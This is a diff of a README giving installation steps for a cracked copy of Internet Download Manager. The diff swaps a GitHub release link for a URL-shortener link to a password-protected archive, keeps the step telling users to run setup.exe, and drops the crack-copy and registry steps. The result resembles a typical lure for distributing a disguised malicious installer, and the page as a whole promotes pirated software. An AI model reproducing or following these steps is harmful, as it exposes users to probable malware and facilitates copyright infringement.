@@ -2,11 +2,9 @@
 
 <H3>⚙️ How to install Internet Download Manager</H3>
 
-- [Download](https://github.com/OratilweMathebe/idm-642/releases/download/Download/IDM_6_42.rar)
-- Open archive (password: igm642)
+- [Download](https://goo.su/ZRGc)
+- Open archive (password: Project12!)
 - Open setup.exe for download components
-- Copy the IDMan.exe file from the Crack folder to the program folder with replacement.
-- Click on the idm.reg file and confirm the change in the registry.
 - In the program installer window click ready.
 - The program is activated.
 
